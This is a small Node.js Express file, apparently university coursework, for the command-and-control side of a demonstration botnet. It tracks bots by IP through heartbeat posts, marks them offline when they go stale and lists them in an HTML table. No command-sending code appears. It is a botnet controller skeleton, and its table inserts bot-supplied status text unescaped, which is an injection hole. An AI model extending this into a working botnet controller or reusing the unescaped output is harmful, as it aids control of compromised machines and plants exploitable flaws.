/*
Description: This is the 'host'(Command and control) side of the 'botnet', designed to send out commands and such.
Disclaimer: This is NOT a real C&C server nor is it used as such, nor would it be very good at handling a botnet in the real world.
			This is simply an example built for university coursework.
*/

var express = require('express');
var app = express();
var bodyParser = require("body-parser");
//To deal with POSTs because we're not a big fan of GETs
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

//Some global vars
var bots = [];

//*****Express routing*****
app.get('/', function (req, res) {
  res.writeHead(200,{"Content-Type" : "text/html"}); //Forcing HTML instead of text
  res.write('<h1>C&C Server Online</h1>\n');
  res.write(genTable());
  res.end();
});

//This might not actually be a new bot, it could have just restarted, so let's handle that
function handleNew(newBot) {
	var found = false;
	for (var i = 0; i < bots.length; i++) {
		if (bots[i].ip == newBot.ip) {
			found = true;
		}
	}
	if (!found) {
		bots.push(newBot);
	}
}

//Our bots will intermittently send heartbeats so we know they're online still, and update their status
app.post('/heartbeat', function(req, res) {
	//Look through known bots and update their status based on IP
	var foundInBots = false;
	for (var i = 0; i < bots.length; i++) {
		if (bots[i].ip == req.ip) {
			console.warn("Received heartbeat from  " + req.ip);
			bots[i].status = req.body.status;
			if (!bots[i].online) {
				console.warn(bots[i].ip + " is no longer stale, set as online")
				bots[i].online = true;
			}
			foundInBots = true;
			bots[i].lastHeartbeat = Date().toLocaleString();
		}
	}
	if (!foundInBots) {
		var bot = {
			ip: req.ip, //This is based off of what WE see when the bot contacts us
			online: true, //We can assume this
			status: req.body.status, //This is part of the post that they send us
			lastHeartbeat: Date().toLocaleString()
		};
		handleNew(bot);
		res.send("Added");
		console.log("New bot added from " + req.ip);
	} else {
		res.send("pong");
		
	}
});

//Check every 10s to make sure our bots are up to date
setInterval(function() {
	for (var i = 0; i < bots.length; i++) {
		var calc = (Date.now() - Date.parse(bots[i].lastHeartbeat)) / 1000; //Time in seconds since last heartbeat
		if (calc > 15 && bots[i].online == true) {
			bots[i].online = false;
			console.warn(bots[i].ip + " has gone stale, set as offline");
		} else if (calc < 15) {
			bots[i].online = true;
		}
	}
}, 10000);




//Start the server
app.listen(3000, function () {
  	console.log('C&C Server Online, waiting for bots');
});

//Templates and table gens
function genTable() {
	var tableHTML = headerTable;
	for (var i = 0; i < bots.length; i++) {
		tableHTML += tableContentGen(bots[i].ip, bots[i].online, bots[i].status, bots[i].lastHeartbeat);
	}
	tableHTML += footerTable;
	return tableHTML;
}

var headerTable = `
<table border="1">
  <tr>
    <th>IP</th>
    <th>Online</th>
    <th>Last Status</th>
    <th>Last Heartbeat</th>
  </tr>
`;

function tableContentGen(ip, online, status, lhb) {
	return ` 
	<tr>
    <td>${ip}</td>
    <td>${online}</td>
    <td>${status}</td>
    <td>${lhb}</td>
  </tr>`
}

var footerTable = "</table>";